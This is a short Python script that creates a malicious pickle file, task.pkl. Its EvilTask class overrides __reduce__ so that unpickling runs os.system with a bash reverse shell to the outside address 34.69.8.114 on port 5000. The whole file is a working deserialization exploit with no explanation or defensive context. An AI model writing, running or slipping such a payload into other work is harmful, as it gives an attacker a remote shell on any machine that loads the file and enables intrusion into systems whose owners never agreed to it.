import pickle
import os

class EvilTask:
    def __init__(self):
        pass
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/34.69.8.114/5000 0>&1' &",))

def create_evil_task():
    evil_task = EvilTask()
    with open('task.pkl', mode='wb') as f:
        pickle.dump(evil_task, file=f)

if __name__ == '__main__':
    create_evil_task()